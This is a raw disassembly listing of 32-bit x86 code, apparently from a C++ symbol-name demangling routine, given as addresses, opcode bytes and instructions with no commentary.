  403373:	31 c0                	xor    %eax,%eax
  403375:	5b                   	pop    %ebx
  403376:	5e                   	pop    %esi
  403377:	c3                   	ret
  403378:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40337f:	90                   	nop
  403380:	56                   	push   %esi
  403381:	53                   	push   %ebx
  403382:	89 c3                	mov    %eax,%ebx
  403384:	83 ec 14             	sub    $0x14,%esp
  403387:	8b 40 0c             	mov    0xc(%eax),%eax
  40338a:	80 38 4a             	cmpb   $0x4a,(%eax)
  40338d:	74 51                	je     0x4033e0
  40338f:	85 d2                	test   %edx,%edx
  403391:	74 35                	je     0x4033c8
  403393:	89 d8                	mov    %ebx,%eax
  403395:	e8 66 f5 ff ff       	call   0x402900
  40339a:	89 c6                	mov    %eax,%esi
  40339c:	85 c0                	test   %eax,%eax
  40339e:	74 35                	je     0x4033d5
  4033a0:	89 d8                	mov    %ebx,%eax
  4033a2:	e8 29 ff ff ff       	call   0x4032d0
  4033a7:	85 c0                	test   %eax,%eax
  4033a9:	74 2a                	je     0x4033d5
  4033ab:	89 04 24             	mov    %eax,(%esp)
  4033ae:	89 f1                	mov    %esi,%ecx
  4033b0:	89 d8                	mov    %ebx,%eax
  4033b2:	ba 2a 00 00 00       	mov    $0x2a,%edx
  4033b7:	e8 04 e7 ff ff       	call   0x401ac0
  4033bc:	83 c4 14             	add    $0x14,%esp
  4033bf:	5b                   	pop    %ebx
  4033c0:	5e                   	pop    %esi
  4033c1:	c3                   	ret
  4033c2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4033c8:	89 d8                	mov    %ebx,%eax
  4033ca:	31 f6                	xor    %esi,%esi
  4033cc:	e8 ff fe ff ff       	call   0x4032d0
  4033d1:	85 c0                	test   %eax,%eax
  4033d3:	75 d6                	jne    0x4033ab
  4033d5:	83 c4 14             	add    $0x14,%esp
  4033d8:	31 c0                	xor    %eax,%eax
  4033da:	5b                   	pop    %ebx
  4033db:	5e                   	pop    %esi
  4033dc:	c3                   	ret
  4033dd:	8d 76 00             	lea    0x0(%esi),%esi
  4033e0:	83 c0 01             	add    $0x1,%eax
  4033e3:	89 43 0c             	mov    %eax,0xc(%ebx)
  4033e6:	eb ab                	jmp    0x403393
  4033e8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4033ef:	90                   	nop
  4033f0:	53                   	push   %ebx
  4033f1:	89 c3                	mov    %eax,%ebx
  4033f3:	83 ec 08             	sub    $0x8,%esp
  4033f6:	f6 40 0a 04          	testb  $0x4,0xa(%eax)
  4033fa:	75 24                	jne    0x403420
  4033fc:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4033ff:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  403405:	77 21                	ja     0x403428
  403407:	8b 53 0c             	mov    0xc(%ebx),%edx
  40340a:	8d 41 01             	lea    0x1(%ecx),%eax
  40340d:	89 43 3c             	mov    %eax,0x3c(%ebx)
  403410:	31 c0                	xor    %eax,%eax
  403412:	80 3a 46             	cmpb   $0x46,(%edx)
  403415:	74 19                	je     0x403430
  403417:	89 4b 3c             	mov    %ecx,0x3c(%ebx)
  40341a:	83 c4 08             	add    $0x8,%esp
  40341d:	5b                   	pop    %ebx
  40341e:	c3                   	ret
  40341f:	90                   	nop
  403420:	8b 50 0c             	mov    0xc(%eax),%edx
  403423:	80 3a 46             	cmpb   $0x46,(%edx)
  403426:	74 08                	je     0x403430
  403428:	83 c4 08             	add    $0x8,%esp
  40342b:	31 c0                	xor    %eax,%eax
  40342d:	5b                   	pop    %ebx
  40342e:	c3                   	ret
  40342f:	90                   	nop
  403430:	8d 42 01             	lea    0x1(%edx),%eax
  403433:	89 43 0c             	mov    %eax,0xc(%ebx)
  403436:	80 7a 01 59          	cmpb   $0x59,0x1(%edx)
  40343a:	75 06                	jne    0x403442
  40343c:	83 c2 02             	add    $0x2,%edx
  40343f:	89 53 0c             	mov    %edx,0xc(%ebx)
  403442:	ba 01 00 00 00       	mov    $0x1,%edx
  403447:	89 d8                	mov    %ebx,%eax
  403449:	e8 32 ff ff ff       	call   0x403380
  40344e:	89 c2                	mov    %eax,%edx
  403450:	89 d8                	mov    %ebx,%eax
  403452:	e8 29 e9 ff ff       	call   0x401d80
  403457:	8b 53 0c             	mov    0xc(%ebx),%edx
  40345a:	80 3a 45             	cmpb   $0x45,(%edx)
  40345d:	74 11                	je     0x403470
  40345f:	31 c0                	xor    %eax,%eax
  403461:	f6 43 0a 04          	testb  $0x4,0xa(%ebx)
  403465:	75 b3                	jne    0x40341a
  403467:	8b 4b 3c             	mov    0x3c(%ebx),%ecx
  40346a:	83 e9 01             	sub    $0x1,%ecx
  40346d:	eb a8                	jmp    0x403417
  40346f:	90                   	nop
  403470:	83 c2 01             	add    $0x1,%edx
  403473:	89 53 0c             	mov    %edx,0xc(%ebx)
  403476:	eb e9                	jmp    0x403461
  403478:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40347f:	90                   	nop
  403480:	56                   	push   %esi
  403481:	53                   	push   %ebx
  403482:	89 c3                	mov    %eax,%ebx
  403484:	83 ec 14             	sub    $0x14,%esp
  403487:	8b 40 0c             	mov    0xc(%eax),%eax
  40348a:	80 38 54             	cmpb   $0x54,(%eax)
  40348d:	75 47                	jne    0x4034d6
  40348f:	89 d6                	mov    %edx,%esi
  403491:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  403495:	80 fa 74             	cmp    $0x74,%dl
  403498:	0f 84 92 00 00 00    	je     0x403530
  40349e:	7f 40                	jg     0x4034e0
  4034a0:	80 fa 6e             	cmp    $0x6e,%dl
  4034a3:	74 6b                	je     0x403510
  4034a5:	80 fa 70             	cmp    $0x70,%dl
  4034a8:	75 2c                	jne    0x4034d6
  4034aa:	83 c0 02             	add    $0x2,%eax
  4034ad:	89 f2                	mov    %esi,%edx
  4034af:	89 43 0c             	mov    %eax,0xc(%ebx)
  4034b2:	89 d8                	mov    %ebx,%eax
  4034b4:	e8 c7 ff ff ff       	call   0x403480
  4034b9:	ba 5d 00 00 00       	mov    $0x5d,%edx
  4034be:	89 c1                	mov    %eax,%ecx
  4034c0:	85 c0                	test   %eax,%eax
  4034c2:	75 2e                	jne    0x4034f2
  4034c4:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4034cb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4034cf:	90                   	nop
  4034d0:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  4034d6:	83 c4 14             	add    $0x14,%esp
  4034d9:	31 c0                	xor    %eax,%eax
  4034db:	5b                   	pop    %ebx
  4034dc:	5e                   	pop    %esi
  4034dd:	c3                   	ret
  4034de:	66 90                	xchg   %ax,%ax
  4034e0:	80 fa 79             	cmp    $0x79,%dl
  4034e3:	75 f1                	jne    0x4034d6
  4034e5:	83 c0 02             	add    $0x2,%eax
  4034e8:	ba 5a 00 00 00       	mov    $0x5a,%edx
  4034ed:	31 c9                	xor    %ecx,%ecx
  4034ef:	89 43 0c             	mov    %eax,0xc(%ebx)
  4034f2:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4034f9:	89 d8                	mov    %ebx,%eax
  4034fb:	e8 c0 e5 ff ff       	call   0x401ac0
  403500:	83 c4 14             	add    $0x14,%esp
  403503:	5b                   	pop    %ebx
  403504:	5e                   	pop    %esi
  403505:	c3                   	ret
  403506:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40350d:	8d 76 00             	lea    0x0(%esi),%esi
  403510:	83 c0 02             	add    $0x2,%eax
  403513:	89 43 0c             	mov    %eax,0xc(%ebx)
  403516:	89 d8                	mov    %ebx,%eax
  403518:	e8 e3 f3 ff ff       	call   0x402900
  40351d:	89 c1                	mov    %eax,%ecx
  40351f:	85 c0                	test   %eax,%eax
  403521:	74 ad                	je     0x4034d0
  403523:	ba 5b 00 00 00       	mov    $0x5b,%edx
  403528:	eb c8                	jmp    0x4034f2
  40352a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403530:	83 c0 02             	add    $0x2,%eax
  403533:	89 f2                	mov    %esi,%edx
  403535:	89 43 0c             	mov    %eax,0xc(%ebx)
  403538:	89 d8                	mov    %ebx,%eax
  40353a:	e8 21 00 00 00       	call   0x403560
  40353f:	89 c1                	mov    %eax,%ecx
  403541:	85 c0                	test   %eax,%eax
  403543:	74 8b                	je     0x4034d0
  403545:	8b 43 0c             	mov    0xc(%ebx),%eax
  403548:	80 38 45             	cmpb   $0x45,(%eax)
  40354b:	75 83                	jne    0x4034d0
  40354d:	83 c0 01             	add    $0x1,%eax
  403550:	ba 5c 00 00 00       	mov    $0x5c,%edx
  403555:	89 43 0c             	mov    %eax,0xc(%ebx)
  403558:	eb 98                	jmp    0x4034f2
  40355a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403560:	57                   	push   %edi
  403561:	89 d7                	mov    %edx,%edi
  403563:	56                   	push   %esi
  403564:	89 c6                	mov    %eax,%esi
  403566:	53                   	push   %ebx
  403567:	83 ec 20             	sub    $0x20,%esp
  40356a:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403571:	00 
  403572:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403576:	eb 0d                	jmp    0x403585
  403578:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40357f:	90                   	nop
  403580:	89 03                	mov    %eax,(%ebx)
  403582:	8d 58 10             	lea    0x10(%eax),%ebx
  403585:	89 fa                	mov    %edi,%edx
  403587:	89 f0                	mov    %esi,%eax
  403589:	e8 f2 fe ff ff       	call   0x403480
  40358e:	85 c0                	test   %eax,%eax
  403590:	75 ee                	jne    0x403580
  403592:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403596:	85 c0                	test   %eax,%eax
  403598:	74 15                	je     0x4035af
  40359a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4035a1:	89 c1                	mov    %eax,%ecx
  4035a3:	ba 59 00 00 00       	mov    $0x59,%edx
  4035a8:	89 f0                	mov    %esi,%eax
  4035aa:	e8 11 e5 ff ff       	call   0x401ac0
  4035af:	83 c4 20             	add    $0x20,%esp
  4035b2:	5b                   	pop    %ebx
  4035b3:	5e                   	pop    %esi
  4035b4:	5f                   	pop    %edi
  4035b5:	c3                   	ret
  4035b6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4035bd:	8d 76 00             	lea    0x0(%esi),%esi
  4035c0:	55                   	push   %ebp
  4035c1:	57                   	push   %edi
  4035c2:	89 c7                	mov    %eax,%edi
  4035c4:	56                   	push   %esi
  4035c5:	53                   	push   %ebx
  4035c6:	83 ec 2c             	sub    $0x2c,%esp
  4035c9:	8b 40 0c             	mov    0xc(%eax),%eax
  4035cc:	0f b6 30             	movzbl (%eax),%esi
  4035cf:	89 f3                	mov    %esi,%ebx
  4035d1:	84 db                	test   %bl,%bl
  4035d3:	0f 84 e7 00 00 00    	je     0x4036c0
  4035d9:	8d 50 01             	lea    0x1(%eax),%edx
  4035dc:	89 57 0c             	mov    %edx,0xc(%edi)
  4035df:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
  4035e3:	0f b6 30             	movzbl (%eax),%esi
  4035e6:	89 dd                	mov    %ebx,%ebp
  4035e8:	84 db                	test   %bl,%bl
  4035ea:	74 24                	je     0x403610
  4035ec:	8d 50 02             	lea    0x2(%eax),%edx
  4035ef:	89 f3                	mov    %esi,%ebx
  4035f1:	89 57 0c             	mov    %edx,0xc(%edi)
  4035f4:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4035f8:	89 c5                	mov    %eax,%ebp
  4035fa:	80 fb 76             	cmp    $0x76,%bl
  4035fd:	0f 85 21 01 00 00    	jne    0x403724
  403603:	83 e8 30             	sub    $0x30,%eax
  403606:	3c 09                	cmp    $0x9,%al
  403608:	0f 86 b9 00 00 00    	jbe    0x4036c7
  40360e:	66 90                	xchg   %ax,%ax
  403610:	bb 49 00 00 00       	mov    $0x49,%ebx
  403615:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  403619:	31 d2                	xor    %edx,%edx
  40361b:	89 ef                	mov    %ebp,%edi
  40361d:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403621:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403628:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40362f:	90                   	nop
  403630:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403634:	29 d3                	sub    %edx,%ebx
  403636:	89 d8                	mov    %ebx,%eax
  403638:	c1 e8 1f             	shr    $0x1f,%eax
  40363b:	01 d8                	add    %ebx,%eax
  40363d:	89 f3                	mov    %esi,%ebx
  40363f:	d1 f8                	sar    $1,%eax
  403641:	01 d0                	add    %edx,%eax
  403643:	89 c1                	mov    %eax,%ecx
  403645:	c1 e1 04             	shl    $0x4,%ecx
  403648:	8d a9 80 04 43 00    	lea    0x430480(%ecx),%ebp
  40364e:	8b 89 80 04 43 00    	mov    0x430480(%ecx),%ecx
  403654:	38 19                	cmp    %bl,(%ecx)
  403656:	74 18                	je     0x403670
  403658:	7f 5e                	jg     0x4036b8
  40365a:	8d 50 01             	lea    0x1(%eax),%edx
  40365d:	8b 44 24 18          	mov    0x18(%esp),%eax
  403661:	39 c2                	cmp    %eax,%edx
  403663:	75 cb                	jne    0x403630
  403665:	31 c0                	xor    %eax,%eax
  403667:	83 c4 2c             	add    $0x2c,%esp
  40366a:	5b                   	pop    %ebx
  40366b:	5e                   	pop    %esi
  40366c:	5f                   	pop    %edi
  40366d:	5d                   	pop    %ebp
  40366e:	c3                   	ret
  40366f:	90                   	nop
  403670:	89 fb                	mov    %edi,%ebx
  403672:	38 59 01             	cmp    %bl,0x1(%ecx)
  403675:	75 e1                	jne    0x403658
  403677:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40367b:	8b 57 14             	mov    0x14(%edi),%edx
  40367e:	3b 57 18             	cmp    0x18(%edi),%edx
  403681:	7d e2                	jge    0x403665
  403683:	8b 47 10             	mov    0x10(%edi),%eax
  403686:	8d 0c 92             	lea    (%edx,%edx,4),%ecx
  403689:	83 c2 01             	add    $0x1,%edx
  40368c:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  40368f:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  403696:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40369d:	89 57 14             	mov    %edx,0x14(%edi)
  4036a0:	c7 00 33 00 00 00    	movl   $0x33,(%eax)
  4036a6:	89 68 0c             	mov    %ebp,0xc(%eax)
  4036a9:	83 c4 2c             	add    $0x2c,%esp
  4036ac:	5b                   	pop    %ebx
  4036ad:	5e                   	pop    %esi
  4036ae:	5f                   	pop    %edi
  4036af:	5d                   	pop    %ebp
  4036b0:	c3                   	ret
  4036b1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4036b8:	89 44 24 18          	mov    %eax,0x18(%esp)
  4036bc:	eb 9f                	jmp    0x40365d
  4036be:	66 90                	xchg   %ax,%ax
  4036c0:	31 ed                	xor    %ebp,%ebp
  4036c2:	e9 49 ff ff ff       	jmp    0x403610
  4036c7:	89 f8                	mov    %edi,%eax
  4036c9:	e8 42 ee ff ff       	call   0x402510
  4036ce:	8b 57 14             	mov    0x14(%edi),%edx
  4036d1:	89 c1                	mov    %eax,%ecx
  4036d3:	3b 57 18             	cmp    0x18(%edi),%edx
  4036d6:	7d 8d                	jge    0x403665
  4036d8:	8b 47 10             	mov    0x10(%edi),%eax
  4036db:	8d 1c 92             	lea    (%edx,%edx,4),%ebx
  4036de:	83 c2 01             	add    $0x1,%edx
  4036e1:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  4036e4:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  4036eb:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4036f2:	89 57 14             	mov    %edx,0x14(%edi)
  4036f5:	85 c9                	test   %ecx,%ecx
  4036f7:	0f 84 68 ff ff ff    	je     0x403665
  4036fd:	89 eb                	mov    %ebp,%ebx
  4036ff:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  403706:	0f be d3             	movsbl %bl,%edx
  403709:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  403710:	83 ea 30             	sub    $0x30,%edx
  403713:	c7 00 34 00 00 00    	movl   $0x34,(%eax)
  403719:	89 50 0c             	mov    %edx,0xc(%eax)
  40371c:	89 48 10             	mov    %ecx,0x10(%eax)
  40371f:	e9 43 ff ff ff       	jmp    0x403667
  403724:	80 fb 63             	cmp    $0x63,%bl
  403727:	0f 85 e3 fe ff ff    	jne    0x403610
  40372d:	89 e8                	mov    %ebp,%eax
  40372f:	3c 76                	cmp    $0x76,%al
  403731:	0f 85 d9 fe ff ff    	jne    0x403610
  403737:	8b 57 30             	mov    0x30(%edi),%edx
  40373a:	31 c0                	xor    %eax,%eax
  40373c:	8b 5f 34             	mov    0x34(%edi),%ebx
  40373f:	85 d2                	test   %edx,%edx
  403741:	0f 94 c0             	sete   %al
  403744:	89 47 34             	mov    %eax,0x34(%edi)
  403747:	89 f8                	mov    %edi,%eax
  403749:	e8 b2 f1 ff ff       	call   0x402900
  40374e:	8b 77 34             	mov    0x34(%edi),%esi
  403751:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403758:	89 c1                	mov    %eax,%ecx
  40375a:	85 f6                	test   %esi,%esi
  40375c:	74 17                	je     0x403775
  40375e:	ba 36 00 00 00       	mov    $0x36,%edx
  403763:	89 f8                	mov    %edi,%eax
  403765:	e8 56 e3 ff ff       	call   0x401ac0
  40376a:	89 5f 34             	mov    %ebx,0x34(%edi)
  40376d:	83 c4 2c             	add    $0x2c,%esp
  403770:	5b                   	pop    %ebx
  403771:	5e                   	pop    %esi
  403772:	5f                   	pop    %edi
  403773:	5d                   	pop    %ebp
  403774:	c3                   	ret
  403775:	ba 35 00 00 00       	mov    $0x35,%edx
  40377a:	89 f8                	mov    %edi,%eax
  40377c:	e8 3f e3 ff ff       	call   0x401ac0
  403781:	eb e7                	jmp    0x40376a
  403783:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40378a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403790:	55                   	push   %ebp
  403791:	89 d5                	mov    %edx,%ebp
  403793:	57                   	push   %edi
  403794:	56                   	push   %esi
  403795:	53                   	push   %ebx
  403796:	89 c3                	mov    %eax,%ebx
  403798:	83 ec 3c             	sub    $0x3c,%esp
  40379b:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40379f:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4037a3:	e8 c8 f0 ff ff       	call   0x402870
  4037a8:	85 c0                	test   %eax,%eax
  4037aa:	0f 84 48 02 00 00    	je     0x4039f8
  4037b0:	8b 53 0c             	mov    0xc(%ebx),%edx
  4037b3:	89 c7                	mov    %eax,%edi
  4037b5:	0f b6 02             	movzbl (%edx),%eax
  4037b8:	3c 46                	cmp    $0x46,%al
  4037ba:	0f 84 88 01 00 00    	je     0x403948
  4037c0:	8d 50 d0             	lea    -0x30(%eax),%edx
  4037c3:	31 ff                	xor    %edi,%edi
  4037c5:	80 fa 09             	cmp    $0x9,%dl
  4037c8:	0f 86 90 01 00 00    	jbe    0x40395e
  4037ce:	8d 50 9f             	lea    -0x61(%eax),%edx
  4037d1:	80 fa 19             	cmp    $0x19,%dl
  4037d4:	0f 87 86 00 00 00    	ja     0x403860
  4037da:	8b 53 30             	mov    0x30(%ebx),%edx
  4037dd:	3c 6f                	cmp    $0x6f,%al
  4037df:	0f 84 23 02 00 00    	je     0x403a08
  4037e5:	89 d8                	mov    %ebx,%eax
  4037e7:	89 54 24 14          	mov    %edx,0x14(%esp)
  4037eb:	e8 d0 fd ff ff       	call   0x4035c0
  4037f0:	8b 54 24 14          	mov    0x14(%esp),%edx
  4037f4:	89 c6                	mov    %eax,%esi
  4037f6:	89 53 30             	mov    %edx,0x30(%ebx)
  4037f9:	85 c0                	test   %eax,%eax
  4037fb:	0f 84 8f 02 00 00    	je     0x403a90
  403801:	83 38 33             	cmpl   $0x33,(%eax)
  403804:	0f 85 5d 01 00 00    	jne    0x403967
  40380a:	8b 40 0c             	mov    0xc(%eax),%eax
  40380d:	8b 4b 2c             	mov    0x2c(%ebx),%ecx
  403810:	8b 50 08             	mov    0x8(%eax),%edx
  403813:	8b 00                	mov    (%eax),%eax
  403815:	8d 54 11 07          	lea    0x7(%ecx,%edx,1),%edx
  403819:	89 53 2c             	mov    %edx,0x2c(%ebx)
  40381c:	80 38 6c             	cmpb   $0x6c,(%eax)
  40381f:	0f 85 42 01 00 00    	jne    0x403967
  403825:	80 78 01 69          	cmpb   $0x69,0x1(%eax)
  403829:	0f 85 38 01 00 00    	jne    0x403967
  40382f:	80 78 02 00          	cmpb   $0x0,0x2(%eax)
  403833:	0f 85 2e 01 00 00    	jne    0x403967
  403839:	89 d8                	mov    %ebx,%eax
  40383b:	e8 d0 ec ff ff       	call   0x402510
  403840:	89 f1                	mov    %esi,%ecx
  403842:	ba 38 00 00 00       	mov    $0x38,%edx
  403847:	89 04 24             	mov    %eax,(%esp)
  40384a:	89 d8                	mov    %ebx,%eax
  40384c:	e8 6f e2 ff ff       	call   0x401ac0
  403851:	89 c6                	mov    %eax,%esi
  403853:	e9 0f 01 00 00       	jmp    0x403967
  403858:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40385f:	90                   	nop
  403860:	3c 44                	cmp    $0x44,%al
  403862:	0f 84 c8 01 00 00    	je     0x403a30
  403868:	8d 50 bd             	lea    -0x43(%eax),%edx
  40386b:	80 fa 01             	cmp    $0x1,%dl
  40386e:	0f 86 47 05 00 00    	jbe    0x403dbb
  403874:	3c 4c                	cmp    $0x4c,%al
  403876:	0f 84 5c 01 00 00    	je     0x4039d8
  40387c:	3c 55                	cmp    $0x55,%al
  40387e:	0f 85 74 01 00 00    	jne    0x4039f8
  403884:	8b 43 0c             	mov    0xc(%ebx),%eax
  403887:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  40388b:	80 fa 6c             	cmp    $0x6c,%dl
  40388e:	0f 84 74 03 00 00    	je     0x403c08
  403894:	80 fa 74             	cmp    $0x74,%dl
  403897:	0f 85 5b 01 00 00    	jne    0x4039f8
  40389d:	80 38 55             	cmpb   $0x55,(%eax)
  4038a0:	0f 85 ea 01 00 00    	jne    0x403a90
  4038a6:	8d 50 01             	lea    0x1(%eax),%edx
  4038a9:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4038ad:	89 53 0c             	mov    %edx,0xc(%ebx)
  4038b0:	80 78 01 74          	cmpb   $0x74,0x1(%eax)
  4038b4:	0f 85 d6 01 00 00    	jne    0x403a90
  4038ba:	8d 50 02             	lea    0x2(%eax),%edx
  4038bd:	89 53 0c             	mov    %edx,0xc(%ebx)
  4038c0:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  4038c4:	3c 5f                	cmp    $0x5f,%al
  4038c6:	0f 84 e1 04 00 00    	je     0x403dad
  4038cc:	3c 6e                	cmp    $0x6e,%al
  4038ce:	0f 84 ef 04 00 00    	je     0x403dc3
  4038d4:	89 d8                	mov    %ebx,%eax
  4038d6:	e8 55 e3 ff ff       	call   0x401c30
  4038db:	83 c0 01             	add    $0x1,%eax
  4038de:	0f 88 ac 01 00 00    	js     0x403a90
  4038e4:	8b 53 0c             	mov    0xc(%ebx),%edx
  4038e7:	80 3a 5f             	cmpb   $0x5f,(%edx)
  4038ea:	0f 85 a0 01 00 00    	jne    0x403a90
  4038f0:	83 c2 01             	add    $0x1,%edx
  4038f3:	89 53 0c             	mov    %edx,0xc(%ebx)
  4038f6:	8b 53 14             	mov    0x14(%ebx),%edx
  4038f9:	3b 53 18             	cmp    0x18(%ebx),%edx
  4038fc:	0f 8d 8e 01 00 00    	jge    0x403a90
  403902:	8b 4b 10             	mov    0x10(%ebx),%ecx
  403905:	8d 34 92             	lea    (%edx,%edx,4),%esi
  403908:	83 c2 01             	add    $0x1,%edx
  40390b:	8d 34 b1             	lea    (%ecx,%esi,4),%esi
  40390e:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  403915:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40391c:	89 53 14             	mov    %edx,0x14(%ebx)
  40391f:	89 46 0c             	mov    %eax,0xc(%esi)
  403922:	8b 43 20             	mov    0x20(%ebx),%eax
  403925:	c7 06 4a 00 00 00    	movl   $0x4a,(%esi)
  40392b:	3b 43 24             	cmp    0x24(%ebx),%eax
  40392e:	0f 8d 5c 01 00 00    	jge    0x403a90
  403934:	8b 53 1c             	mov    0x1c(%ebx),%edx
  403937:	89 34 82             	mov    %esi,(%edx,%eax,4)
  40393a:	83 c0 01             	add    $0x1,%eax
  40393d:	89 43 20             	mov    %eax,0x20(%ebx)
  403940:	eb 25                	jmp    0x403967
  403942:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403948:	8d 42 01             	lea    0x1(%edx),%eax
  40394b:	89 43 0c             	mov    %eax,0xc(%ebx)
  40394e:	0f b6 42 01          	movzbl 0x1(%edx),%eax
  403952:	8d 50 d0             	lea    -0x30(%eax),%edx
  403955:	80 fa 09             	cmp    $0x9,%dl
  403958:	0f 87 70 fe ff ff    	ja     0x4037ce
  40395e:	89 d8                	mov    %ebx,%eax
  403960:	e8 ab eb ff ff       	call   0x402510
  403965:	89 c6                	mov    %eax,%esi
  403967:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40396b:	85 c0                	test   %eax,%eax
  40396d:	74 13                	je     0x403982
  40396f:	89 04 24             	mov    %eax,(%esp)
  403972:	89 f1                	mov    %esi,%ecx
  403974:	ba 57 00 00 00       	mov    $0x57,%edx
  403979:	89 d8                	mov    %ebx,%eax
  40397b:	e8 40 e1 ff ff       	call   0x401ac0
  403980:	89 c6                	mov    %eax,%esi
  403982:	8b 43 0c             	mov    0xc(%ebx),%eax
  403985:	80 38 42             	cmpb   $0x42,(%eax)
  403988:	0f 84 12 01 00 00    	je     0x403aa0
  40398e:	85 ff                	test   %edi,%edi
  403990:	75 26                	jne    0x4039b8
  403992:	85 ed                	test   %ebp,%ebp
  403994:	74 13                	je     0x4039a9
  403996:	89 34 24             	mov    %esi,(%esp)
  403999:	89 e9                	mov    %ebp,%ecx
  40399b:	ba 01 00 00 00       	mov    $0x1,%edx
  4039a0:	89 d8                	mov    %ebx,%eax
  4039a2:	e8 19 e1 ff ff       	call   0x401ac0
  4039a7:	89 c6                	mov    %eax,%esi
  4039a9:	83 c4 3c             	add    $0x3c,%esp
  4039ac:	89 f0                	mov    %esi,%eax
  4039ae:	5b                   	pop    %ebx
  4039af:	5e                   	pop    %esi
  4039b0:	5f                   	pop    %edi
  4039b1:	5d                   	pop    %ebp
  4039b2:	c3                   	ret
  4039b3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4039b7:	90                   	nop
  4039b8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4039bf:	89 f1                	mov    %esi,%ecx
  4039c1:	ba 51 00 00 00       	mov    $0x51,%edx
  4039c6:	89 d8                	mov    %ebx,%eax
  4039c8:	e8 f3 e0 ff ff       	call   0x401ac0
  4039cd:	89 c6                	mov    %eax,%esi
  4039cf:	eb c1                	jmp    0x403992
  4039d1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4039d8:	83 43 0c 01          	addl   $0x1,0xc(%ebx)
  4039dc:	89 d8                	mov    %ebx,%eax
  4039de:	e8 2d eb ff ff       	call   0x402510
  4039e3:	89 c6                	mov    %eax,%esi
  4039e5:	85 c0                	test   %eax,%eax
  4039e7:	74 0f                	je     0x4039f8
  4039e9:	89 d8                	mov    %ebx,%eax
  4039eb:	e8 00 e4 ff ff       	call   0x401df0
  4039f0:	85 c0                	test   %eax,%eax
  4039f2:	0f 85 6f ff ff ff    	jne    0x403967
  4039f8:	83 c4 3c             	add    $0x3c,%esp
  4039fb:	31 f6                	xor    %esi,%esi
  4039fd:	5b                   	pop    %ebx
  4039fe:	89 f0                	mov    %esi,%eax
  403a00:	5e                   	pop    %esi
  403a01:	5f                   	pop    %edi
  403a02:	5d                   	pop    %ebp
  403a03:	c3                   	ret
  403a04:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403a08:	8b 43 0c             	mov    0xc(%ebx),%eax
  403a0b:	80 78 01 6e          	cmpb   $0x6e,0x1(%eax)
  403a0f:	0f 85 d0 fd ff ff    	jne    0x4037e5
  403a15:	83 c0 02             	add    $0x2,%eax
  403a18:	c7 43 30 00 00 00 00 	movl   $0x0,0x30(%ebx)
  403a1f:	89 43 0c             	mov    %eax,0xc(%ebx)
  403a22:	e9 be fd ff ff       	jmp    0x4037e5
  403a27:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403a2e:	66 90                	xchg   %ax,%ax
  403a30:	8b 53 0c             	mov    0xc(%ebx),%edx
  403a33:	80 7a 01 43          	cmpb   $0x43,0x1(%edx)
  403a37:	0f 84 d3 02 00 00    	je     0x403d10
  403a3d:	8b 43 28             	mov    0x28(%ebx),%eax
  403a40:	85 c0                	test   %eax,%eax
  403a42:	74 11                	je     0x403a55
  403a44:	8b 08                	mov    (%eax),%ecx
  403a46:	85 c9                	test   %ecx,%ecx
  403a48:	74 05                	je     0x403a4f
  403a4a:	83 f9 18             	cmp    $0x18,%ecx
  403a4d:	75 06                	jne    0x403a55
